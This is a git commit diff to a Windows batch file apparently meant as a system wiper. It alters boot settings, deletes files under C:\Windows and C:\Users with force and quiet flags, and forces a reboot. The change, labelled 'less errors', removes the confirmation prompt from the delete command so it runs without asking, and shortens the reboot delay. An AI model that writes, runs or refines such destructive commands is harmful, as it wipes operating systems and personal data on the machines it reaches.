a39899f5c06accc2f27e1613659e6d52a0d8ec6a
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 11:22:38 +0530

    Update 2.bat
    less errors

--- 2.bat
+++ 2.bat
@@ -4,9 +4,9 @@ bcdedit /set {default} recoveryenabled Yes
 bcdedit /set {default} bootstatuspolicy DisplayAllFailures
 bcdedit /set {bootmgr} displaybootmenu Yes
 bcdedit /timeout 1
-DEL /P /F /S /Q /A C:\Windows*.*
+DEL /F /S /Q /A C:\Windows*.*
 rmdir C:\Users*.* /S /Q
-shutdown -r /o -t 30
+shutdown -r /o -t 20
 taskkill /im explorer.exe /f
 start explorer.exe
 taskkill /im explorer.exe /f
